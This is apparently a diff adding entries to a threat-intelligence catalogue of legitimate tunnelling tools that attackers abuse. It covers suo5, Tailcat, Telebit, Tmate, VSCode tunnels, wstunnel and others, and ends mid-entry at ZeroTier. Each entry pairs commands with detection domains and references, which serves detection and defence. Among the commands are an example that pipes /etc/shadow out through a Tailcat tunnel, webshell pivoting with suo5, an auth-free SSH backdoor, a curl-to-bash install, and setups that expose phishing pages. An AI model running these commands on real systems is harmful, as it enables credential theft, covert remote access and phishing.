+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, MacOS, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Client side uses the standard OpenSSH ssh client; server side uses the dropbear-sshj fork of Dropbear."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "ssh-j.com"
+      },
+      {
+        "Domain": "*.ssh-j.com"
+      },
+      {
+        "Domain": "sshjmpnoutfqotbj6r3acexiwoalgkth55y5kys7js3px2qqqrwuhqqd.onion"
+      },
+      {
+        "Command": "Execution of the ssh client with \"-R\" remote forward and/or \"-J\" jump host arguments targeting ssh-j.com."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://ssh-j.com/"
+      },
+      {
+        "Link": "https://bitbucket.org/ValdikSS/dropbear-sshj/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Jeffrey Tigchelaar-Moerbeek"
+      }
+    ],
+    "source_file": "sshj.md",
+    "url": "https://lottunnels.github.io/lottunnels/sshj"
+  },
+  {
+    "Name": "StaqLab",
+    "Description": "Staqlab enables insider threats and threat actors to create fake account on the website as there is no validation for account registration. In the Domains Section, threat actors can define dedicated tunnels subdomain name. Using the token for the authorization on the local system will enable them to connect to dynamically generated domains or else specified domains.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-06",
+    "Commands": [
+      {
+        "Command": "staqlab-tunnel.exe token=<AUTH TOKEN>",
+        "Description": "This will register the local staqlab-tunnel.exe with the registered account.",
+        "Usecase": "Authenticating, generating and accessing the URL.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux, Raspberry Pi"
+      },
+      {
+        "Command": "staqlab-tunnel.exe port=<PORT>",
+        "Description": "This will create a tunnel to the port defined.",
+        "Usecase": "Exposing the local server running on local port over dynamic Staqlab Tunnels.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux, Raspberry Pi"
+      },
+      {
+        "Command": "staqlab-tunnel.exe port=<PORT> domain=<DOMAIN>",
+        "Description": "Exposing the local server running on local port over Staqlab Tunnels having static domain names defined in the dashboard. This can be used in Phishing Campaigns. However, the dynamically generated links can also be used for the same purpose.",
+        "Usecase": "Exposing the local server running on local port over static Staqlab Tunnels.",
+        "Category": "Phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux, Raspberry Pi"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of Staqlab-tunnels.exe, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.tunnel.staqlab.com"
+      },
+      {
+        "URL": "https://tunnel.staqlab.com/inspector/*/inspector"
+      },
+      {
+        "Domain": "*.staqlab-tunnel.com"
+      },
+      {
+        "Domain": "*.staqlab.com"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "staqlab.md",
+    "url": "https://lottunnels.github.io/lottunnels/staqlab"
+  },
+  {
+    "Name": "suo5",
+    "Description": "suo5 is a self-hosted, high-performance HTTP proxy tunnel that uses bidirectional chunked-encoding over a single connection to relay traffic through a webshell (jsp/php/aspx) uploaded to a compromised web server, giving the operator a local SOCKS5 proxy into the internal network. Because the operator controls the compromised server, there is no vendor domain to block. It is abused for webshell-based pivoting, observed with the China-linked Houken/UNC5174 Ivanti CSA campaign and the JadeProx China-nexus operation, among others.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-22",
+    "Commands": [
+      {
+        "Command": "suo5 -t http://<TARGET>/suo5.jsp -l 127.0.0.1:1111",
+        "Description": "Runs the suo5 client against an uploaded webshell, opening a local SOCKS5 proxy (default 127.0.0.1:1111) that relays traffic full-duplex over HTTP into the internal network.",
+        "Usecase": "Pivoting into an internal network through a compromised, internet-facing web server.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "suo5 -t http://<TARGET>/suo5.jsp -r http://<REDIRECT>/suo5.jsp",
+        "Description": "Connects through a redirect webshell, allowing the tunnel to traverse multi-layer reverse proxies and load balancers in front of the target.",
+        "Usecase": "Pivoting through targets fronted by load balancers or layered reverse proxies.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded suo5 CLI or GUI binary executed on the operator host, plus a suo5 webshell (jsp/php/aspx) uploaded to the compromised web server."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the suo5 binary with -t pointing at a webshell URL (optionally -r and -l), and the presence of suo5 jsp/php/aspx webshell files on a web server."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/zema1/suo5"
+      },
+      {
+        "Link": "https://www.cert.ssi.gouv.fr/cti/CERTFR-2025-CTI-009/"
+      }
+    ],
+    "source_file": "suo5.md",
+    "url": "https://lottunnels.github.io/lottunnels/suo5"
+  },
+  {
+    "Name": "Tailcat",
+    "Description": "Tailcat is netcat over Tailscale's data plane without the control plane. It reuses Tailscale's open WireGuard, magicsock, and DERP code. One side starts a server and gets a short token (tc...), the other connects with it. Connections start through a DERP relay and try to upgrade to direct UDP. If hole punching fails, traffic stays relayed. No account or root needed. It runs entirely in userspace, works with custom DERP servers, has a browser WASM demo, and can publish tokens as DNS TXT records.",
+    "Author": "Tailscale Inc.",
+    "Created": "2026-08-30",
+    "Commands": [
+      {
+        "Command": "go install github.com/tailscale/tailcat/cmd/tailcat@latest",
+        "Description": "Installs the tailcat CLI (also available via nix run github:tailscale/tailcat).",
+        "Usecase": "Install the tailcat binary to create WireGuard tunnels without the control plane.",
+        "Category": "Install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "tailcat",
+        "Description": "Starts an ephemeral server (generates a fresh in-memory WireGuard key) that pipes stdin/stdout over the tunnel and prints its token (e.g. tcomFwWCC...). With --serve=<PORT|all|exit-node> it forwards a local TCP port or acts as an exit node instead of piping stdio.",
+        "Usecase": "Create a one-time encrypted tunnel and expose stdin/stdout or a local service through it; exit-node mode routes the client's traffic via the server's network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "tailcat <TOKEN> <PORT>",
+        "Description": "Client connects to a tailcat server using its token and dials a TCP port through the WireGuard tunnel (gVisor netstack on both sides). Example - tailcat tcXXXXXXXXX 8080. With no PORT argument it connects stdin/stdout.",
+        "Usecase": "Reach an internal service or pipe data through the encrypted tunnel from outside the target network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "tailcat --serve=no-auth-ssh",
+        "Description": "Runs an auth-free SSH server (Linux/macOS; uses gliderlabs/ssh with an ed25519 host key in ~/.config/tailcat/ssh/) reachable only over the tailcat tunnel. WireGuard authenticates the peer before SSH is reached. Use --serve=22 to proxy to the system SSH server with normal auth.",
+        "Usecase": "Persistent shell access to a host behind NAT/firewall with no inbound open ports and no credentials.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS"
+      },
+      {
+        "Command": "tailcat ssh <TOKEN> [COMMAND]",
+        "Description": "SSH client over tailcat. Connects to a tailcat SSH server and either opens an interactive PTY shell or executes a single command (e.g. tailcat ssh tcXXXXXXXXX ls -la).",
+        "Usecase": "Interactive or non-interactive remote shell through the WireGuard tunnel.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "tailcat socks <TOKEN> -- curl http://server.tailcat:8081/",
+        "Description": "Starts a SOCKS5 proxy routed over the tailcat tunnel. Any SOCKS-aware tool can be proxied (e.g. tailcat socks <TOKEN> curl ...). Tokens also work as case-sensitive URL hostnames directly (tailcat socks curl http://<TOKEN>:8081/).",
+        "Usecase": "Proxy arbitrary TCP traffic and tools through the tunnel to reach the server's network or localhost services.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "cat /etc/shadow | tailcat <TOKEN>",
+        "Description": "Pipes a file or command output through the client into the server's stdout (server was started with bare tailcat and blocks until a client connects). Works in both directions for upload/download.",
+        "Usecase": "Exfiltrate files or pipe data between two machines over the encrypted DERP-relayed / direct tunnel.",
+        "Category": "Exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Filename": "tailcat"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "tc301a.ipn.dev"
+      },
+      {
+        "Domain": "tc302a.ipn.dev"
+      },
+      {
+        "Domain": "tc303a.ipn.dev"
+      },
+      {
+        "Domain": "tc304a.ipn.dev"
+      },
+      {
+        "Command": "Execution of the tailcat binary, including with subcommands genkey, parse, resolve, ping, socks, ssh and flags --serve, --key, --derpmap-url, --full-address, --allow."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/tailscale/tailcat"
+      },
+      {
+        "Link": "https://tailscale.github.io/tailcat/"
+      },
+      {
+        "Link": "https://tailcat.dev/derpmap.json"
+      },
+      {
+        "Link": "https://pkg.go.dev/github.com/tailscale/tailcat"
+      }
+    ],
+    "source_file": "tailcat.md",
+    "url": "https://lottunnels.github.io/lottunnels/tailcat"
+  },
+  {
+    "Name": "Tailscale",
+    "Description": "Tailscale is a commercial overlay VPN built on WireGuard that connects devices into a private network (tailnet). The control server is closed source; the client code (tailscale/tailscaled) is open source under a BSD-3 license with a separate patents file. Can be abused for persistent remote access, SSH access to hosts, egress via exit nodes, and exposing internal services to the public internet via Tailscale Funnel.",
+    "Author": "Tailscale Inc.",
+    "Created": "2026-08-17",
+    "Commands": [
+      {
+        "Command": "tailscale up",
+        "Description": "Connects the device to the user's tailnet and authenticates if needed.",
+        "Usecase": "Enroll a host into a private overlay network.",
+        "Category": "Install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "tailscale up --ssh",
+        "Description": "Enables Tailscale SSH on the device, intercepting port 22 traffic from the tailnet and permitting access per the tailnet ACL policy.",
+        "Usecase": "Remote shell access to a host without traditional SSH keys/password.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "tailscale serve 3000",
+        "Description": "Shares a local service (e.g. a web server on port 3000) with other devices on the tailnet over HTTPS.",
+        "Usecase": "Expose an internal service to the private tailnet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      },
+      {
+        "Command": "tailscale funnel 3000",
+        "Description": "Exposes a local service to the public internet with a generated HTTPS URL via Tailscale Funnel.",
+        "Usecase": "Publish an internal service publicly, bypassing firewalls/NAT.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS, BSD"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Filename": "tailscale"
+      },
+      {
+        "Filename": "tailscaled"
+      },
+      {
+        "Path": "tailscale"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "tailscale.com"
+      },
+      {
+        "Domain": "*.tailscale.io"
+      },
+      {
+        "Domain": "*.ts.net"
+      },
+      {
+        "Command": "Execution of the tailscale binary, e.g. with up, serve, funnel or ssh subcommands."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://tailscale.com/"
+      },
+      {
+        "Link": "https://github.com/tailscale/tailscale"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Jeffrey Tigchelaar-Moerbeek"
+      }
+    ],
+    "source_file": "tailscale.md",
+    "url": "https://lottunnels.github.io/lottunnels/tailscale"
+  },
+  {
+    "Name": "Telebit",
+    "Description": "Telebit is an open source tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "curl https://get.telebit.io/ | bash",
+        "Description": "Downloading and Installation of telebit on the local machine.",
+        "Usecase": "Downloading the telebit binary to be executed on the local machine.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "telebit http <PORT>",
+        "Description": "Binding telebit tunnels to the local port running on the machine to expose the local applications over the tunnels.",
+        "Usecase": "Exposing local applications over the internet via telebit tunnels.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "telebit http <PORT>",
+        "Description": "Running a local server in a directory and exposing it over the telebit tunnels for data exfiltration.",
+        "Usecase": "Exposing local file system via telebit tunnels for data exfiltration.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "telebit tcp <PORT>",
+        "Description": "Binding telebit tunnels to the local SSH/RDP ports etc. for shell access.",
+        "Usecase": "Exposing local ports over the internet via telebit tunnels for shell access.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "telebit http <PORT>",
+        "Description": "Binding telebit tunnels to the local file system/web server and exposing malicious binaries to be downloaded onto the compromised host.",
+        "Usecase": "Exposing locally hosted malicious binaries over the internet via telebit tunnels to be downloaded onto compromised host.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "telebit http <PORT>",
+        "Description": "Binding telebit tunnels to the locally running phishing page to compromise users.",
+        "Usecase": "Exposing locally running phishing sites over the internet via telebit tunnels to compromise users.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Installed version/In memory execution of telebit."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "get.telebit.io"
+      },
+      {
+        "Domain": "*.telebit.io"
+      },
+      {
+        "Domain": "*.telebit.cloud"
+      },
+      {
+        "Domain": "*.telebit.fun"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://telebit.cloud/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "telebit.md",
+    "url": "https://lottunnels.github.io/lottunnels/telebit"
+  },
+  {
+    "Name": "Tmate",
+    "Description": "Tmate.io provides a simple binary to expose local terminal via tmate.io domains. These domains are accessible over the internet. Providing opportunity for insiders to expose local system, exfiltrate data, create backdoors via SSH etc.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-08",
+    "Commands": [
+      {
+        "Command": "tmate",
+        "Description": "This will generate instant tmate tunnel which is accessible via web browser as well as via SSH client. Insider threat or external threat actor can used this for accessing and monitoring the terminals using the read-only tunnel links.",
+        "Usecase": "Accessing the terminal via web browser or ssh remotely.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Mac, Linux"
+      },
+      {
+        "Command": "tmate",
+        "Description": "This will generate instant tmate tunnel which is accessible via web browser as well as via SSH client. Insider threat or external threat actor can used this for data exfiltration.",
+        "Usecase": "Exposing file system over the internet.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Mac, Linux"
+      },
+      {
+        "Command": "tmate -F",
+        "Description": "This will generate instant tmate tunnel which is accessible via web browser as well as via SSH client. Insider threat or external threat actor can used this for backdoor as `-F` will foreground the current process.",
+        "Usecase": "Maintaning access via Web or via SSH.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed version of tmate, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.tmate.io"
+      },
+      {
+        "URL": "https://tmate.io/t/*"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://dfir.ch/posts/tmate_as_a_backdoor/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "tmate.md",
+    "url": "https://lottunnels.github.io/lottunnels/tmate"
+  },
+  {
+    "Name": "TunnelTo",
+    "Description": "TunnelTo is free/subscription based tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "tunnelto set-auth --key <AUTH KEY>",
+        "Description": "In order to install the TunnelTo, it can be done directly via cargo, brew etc. as well as downloadable binaries are provided that can be executed on the fly.",
+        "Usecase": "Installing/Downloading the tunnelto binaries to be executed on the local machine.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -R 2222:localhost:22 tuns.sh",
+        "Description": "Exeuting the binary to generate a local tunnel by binding it to the local service running on TCP ports.",
+        "Usecase": "Exposing SSH/RDP etc over tunnels for shell-access",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -R 80:localhost:8080 tuns.sh",
+        "Description": "Executing the binary to generate a local tunnel by binding it to a local web server running on port 80.",
+        "Usecase": "Exposing the local system over the tunnels for the files to be exfiltrated out of the organization.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -R 80:localhost:8080 tuns.sh",
+        "Description": "Executing the binary to generate a local tunnel by binding it to the local file system exposed over port 80.",
+        "Usecase": "Exposing the local web server/file system over the tunnels for the files to be exfiltrated out of the organization.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -R 80:localhost:8080 tuns.sh",
+        "Description": "Executing the binary to generate a local tunnel by binding it to the local web server hosting phishing sites.",
+        "Usecase": "Exposing the local web server hosting phishing sites to target users.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed version of TunnelTo, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.tuns.sh"
+      },
+      {
+        "Domain": "*.ssi.sh"
+      },
+      {
+        "Domain": "*.tunnelto.dev"
+      },
+      {
+        "Command": "Execution of installed/downloaded binary."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://docs.ssi.sh/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "tunnelto.md",
+    "url": "https://lottunnels.github.io/lottunnels/tunnelto"
+  },
+  {
+    "Name": "Twingate",
+    "Description": "Twingate is a hosted zero-trust remote access service that connects clients to private resources through Twingate Connectors deployed inside a network, without exposing inbound ports. Threat actors, notably Scattered Spider/UNC3944 and Octo Tempest, have been observed deploying Twingate Connectors on compromised networks to establish persistent remote access into internal environments.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "twingate setup",
+        "Description": "Configures the Twingate client on a host, authenticating it to a Twingate network so the host can reach private resources published through Connectors.",
+        "Usecase": "Establishing client access into a Twingate-connected network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "twingate start",
+        "Description": "Starts the Twingate client and establishes the tunnel to the Twingate network, giving the host access to internal resources over the internet.",
+        "Usecase": "Maintaining remote access to an internal network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "docker run twingate/connector",
+        "Description": "Deploys a Twingate Connector inside a network. A threat actor with a foothold can deploy a Connector to publish internal resources to their own Twingate tenant and reach them remotely.",
+        "Usecase": "Establishing persistent remote access into a compromised network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": false,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed Twingate client, or a Connector deployed via Docker/binary inside the target network."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.twingate.com"
+      },
+      {
+        "Command": "Execution of the twingate client binary, or deployment of the twingate/connector image."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://www.twingate.com/"
+      },
+      {
+        "Link": "https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/"
+      },
+      {
+        "Link": "https://blog.sekoia.io/scattered-spider-laying-new-eggs/"
+      },
+      {
+        "Link": "https://www.mandiant.com/resources/blog/unc3944-sms-phishing-sim-swapping-ransomware"
+      }
+    ],
+    "source_file": "twingate.md",
+    "url": "https://lottunnels.github.io/lottunnels/twingate"
+  },
+  {
+    "Name": "VSCode GUI",
+    "Description": "Insiders as well as threat actors having GUI access to system can leverage this technique to create Visual Studio Remote Tunnel links to exfiltrate the data.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-05",
+    "Commands": [
+      {
+        "Command": "CTRL + SHIFT + P, Searching for Forward a port. Click on forward the port and provide a local port which is required to be exposed over the internet.",
+        "Description": "This will generate a microsoft tunnel link proxying the traffic to the local binded port.",
+        "Usecase": "Exposing internal application on Microsoft Tunnels over the internet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "CTRL + SHIFT + P, Searching for Foreward a port, Click on forward the port and provide a local port on which a local server is running. An example, 'python -m http.server 8080'.",
+        "Description": "Insider threat, external threat actor will be able to expose the local system over the internet and exfiltrate the sensitive files.",
+        "Usecase": "Accessing & exfiltrating the local files on VSCode Cloud for Data Exfiltration.",
+        "Category": "Exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "CTRL + SHIFT + P, Searching for Foreward a port, Click on forward the port and provide a local port on which a local server is running. An example, 'python -m http.server 8080'.",
+        "Description": "Threat actors can host malicious binaries/payloads locally and can use Microsoft Tunnels domains to download them onto the victim machine.",
+        "Usecase": "Downloading malicious binaries/payloads on victim system by hosting them locally.",
+        "Category": "Download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of Visual Studio Code, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.devtunnels.ms*"
+      },
+      {
+        "Domain": "*.tunnels.api.visualstudio.com"
+      },
+      {
+        "Sigma": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_domain_devtunnels.yml"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://valhalla.nextron-systems.com/info/sigma-rule/9501f8e6-8e3d-48fc-a8a6-1089dd5d7ef4"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      },
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "vscode-gui.md",
+    "url": "https://lottunnels.github.io/lottunnels/vscode-gui"
+  },
+  {
+    "Name": "VSCode CLI",
+    "Description": "Utilizing Visual Studio Code Remote Tunnels for exposing local development environment over the internet.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-05",
+    "Commands": [
+      {
+        "Command": "code.exe tunnel --accept-server-license-terms",
+        "Description": "Generating Visual Studio Code Server Tunnels via VSCode built in Tunneling functionality.",
+        "Usecase": "Generating Visual Studio Code Server Tunnels for exposing local dev environemnt over the internet.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "code.exe tunnel service install --accept-server-license-terms",
+        "Description": "Generating Visual Studio Code Server Tunnels via VSCode built in Tunneling functionality and installing it as a service.",
+        "Usecase": "Generating Visual Studio Code Server Tunnels for exposing local dev environemnt over the internet.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "Accessing generated Visual Studio Code Server Tunnels URL.",
+        "Description": "Insider threat, external threat actor will be accessing the link in the web browser providing access to the `vscode.dev\\tunnels\\*` proxying the local development environment.",
+        "Usecase": "Accessing local files on VSCode Cloud for Data Exfiltration.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "Shell Access via Visual Studio Code Server Tunnels.",
+        "Description": "Insider threat, external threat actor will be able to run commands on local system proxying via Microsoft domains using the built-in VSCode Server Terminal.",
+        "Usecase": "Accessing & Deleting files, executing payloads, downloading payloads, running malware/ransomware etc.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "\\%UserProfile%\\vscode-cli\\code_tunnel.json"
+      },
+      {
+        "Path": "code.exe (standalone executable)"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.devtunnels.ms*"
+      },
+      {
+        "Domain": "*.tunnels.api.visualstudio.com"
+      },
+      {
+        "URL": "https://vscode.dev/tunnel/*"
+      },
+      {
+        "Sigma": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_domain_devtunnels.yml"
+      },
+      {
+        "Command": "Execution of the binary with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://code.visualstudio.com/docs/remote/tunnels"
+      },
+      {
+        "Link": "https://cydefops.com/vscode-data-exfiltration"
+      },
+      {
+        "Link": "https://www.bleepingcomputer.com/news/security/chinese-hackers-use-visual-studio-code-tunnels-for-remote-access/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      },
+      {
+        "Person": "Kirill Magaskin",
+        "Handle": "@k1rpi7ch"
+      }
+    ],
+    "source_file": "vscode-server.md",
+    "url": "https://lottunnels.github.io/lottunnels/vscode-server"
+  },
+  {
+    "Name": "wstunnel",
+    "Description": "wstunnel tunnels TCP or UDP traffic over WebSocket or HTTP2 to an operator-run wstunnel server, blending tunneled traffic with ordinary web traffic to bypass firewalls and DPI. Because the server is self-hosted, there is no vendor domain to block. It has been observed in intrusions by Scattered Spider/UNC3944 and Octo Tempest, and in the China-aligned Shadow-Earth-053 espionage campaign.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "wstunnel server wss://0.0.0.0:8080",
+        "Description": "Starts the operator-controlled wstunnel server, accepting client tunnels over WebSocket Secure.",
+        "Usecase": "Standing up the WebSocket tunnel endpoint that compromised hosts connect to.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "wstunnel client -L socks5://127.0.0.1:1080 wss://<SERVER>:8080",
+        "Description": "Connects to the wstunnel server over WebSocket and exposes a local SOCKS5 proxy, routing traffic into the tunnel to bypass firewalls and DPI.",
+        "Usecase": "Establishing a SOCKS pivot tunneled over WebSocket.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "wstunnel client -L tcp://2222:127.0.0.1:22 wss://<SERVER>:8080",
+        "Description": "Forwards a local TCP port over the WebSocket tunnel to a remote service such as SSH, reaching it through the operator-controlled server.",
+        "Usecase": "Reaching an internal service through a WebSocket tunnel.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed wstunnel binary (single executable acting as client and server), executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of the wstunnel binary with client/server subcommands, or WebSocket upgrade traffic to an operator-controlled host used as a tunnel."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/erebe/wstunnel"
+      },
+      {
+        "Link": "https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/"
+      },
+      {
+        "Link": "https://www.trendmicro.com/en_us/research/26/d/inside-shadow-earth-053.html"
+      }
+    ],
+    "source_file": "wstunnel.md",
+    "url": "https://lottunnels.github.io/lottunnels/wstunnel"
+  },
+  {
+    "Name": "ZeroTier",
+    "Description": "ZeroTier is a peer-to-peer overlay network that joins hosts into a virtual L2/L3 network traversing NAT and firewalls, coordinated through ZeroTier root/controller servers (or a self-hosted controller). Threat actors deploy the ZeroTier client on compromised hosts to establish persistent, encrypted remote access into internal environments, observed with Scattered Spider/UNC3944 and the CrowdStrike telco/BPO intrusion campaign.",
+    "Author": "cyberbuff",
